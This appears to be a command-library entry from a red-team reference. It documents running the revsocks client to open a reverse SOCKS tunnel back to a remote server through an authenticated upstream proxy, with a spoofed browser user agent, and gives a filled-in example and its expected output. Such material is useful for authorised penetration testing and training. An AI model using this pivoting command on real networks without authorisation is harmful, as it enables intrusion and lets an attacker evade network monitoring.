---
id: a0e7d4ca-6186-4ca2-bc7c-2bfb4438591d
name: revsocks-connect-client-with-proxy
type: command
executor: bash
data: >-
  ./revsocks -connect $_SERVER_IP:8443 -pass $_PASSWORD -proxy
  $_PROXY_HOST:$_PROXY_PORT -proxyauth $_DOMAIN/$_USERNAME:$_PASSWORD -useragent
  "$_USER_AGENT"
output: null
created_at: '2023-04-06T03:56:22.907226Z'
updated_at: '2023-04-10T20:25:18.397562Z'
platforms:
  - Linux
  - Windows
tags:
  - proxy
  - pivoting
  - chain
verified: true
validated: true
---

# revsocks-connect-client-with-proxy

## Command

```bash
./revsocks -connect $_SERVER_IP:8443 -pass $_PASSWORD -proxy $_PROXY_HOST:$_PROXY_PORT -proxyauth $_DOMAIN/$_USERNAME:$_PASSWORD -useragent "$_USER_AGENT"
```

## Description

Connects the client to the revsocks server via an upstream proxy with authentication and custom user agent.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -connect $_SERVER_IP:8443 | Server address/port | Yes |
| -pass $_PASSWORD | Auth password | Yes |
| -proxy $_PROXY_HOST:$_PROXY_PORT | Upstream proxy | No |
| -proxyauth $_DOMAIN/$_USERNAME:$_PASSWORD | Proxy credentials | No |
| -useragent "$_USER_AGENT" | HTTP user agent | No |

## Examples

### Advanced Usage

```bash
./revsocks -connect 10.10.10.10:8443 -pass Password1234 -proxy proxy.domain.local:3128 -proxyauth Domain/username:password -useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

## Expected Output

Connected via proxy to 10.10.10.10:8443
Authenticated
Tunnel established

## Related

- [[procedures/Reverse-SOCKS-Proxy-Pivoting]]
